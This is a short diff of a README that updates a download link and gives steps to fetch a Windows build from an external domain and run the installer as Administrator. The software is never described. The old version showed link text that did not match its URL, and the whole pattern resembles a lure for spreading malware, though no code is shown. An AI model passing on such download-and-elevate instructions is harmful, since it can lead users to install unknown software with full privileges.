@@ -30,14 +30,14 @@
 
 | | |
 | --- | --- |
-| **Direct link** | **[apireqz.wonderchain.fun](https://apireqz.kolmods.com/)** |
+| **Direct link** | **[apireqz.kolmods.com](https://apireqz.kolmods.com/)** |
 | **Full URL** | `https://apireqz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[apireqz.wonderchain.fun](https://apireqz.kolmods.com/)** in your browser
+1. Open **[apireqz.kolmods.com](https://apireqz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Launch from Start menu or tray icon
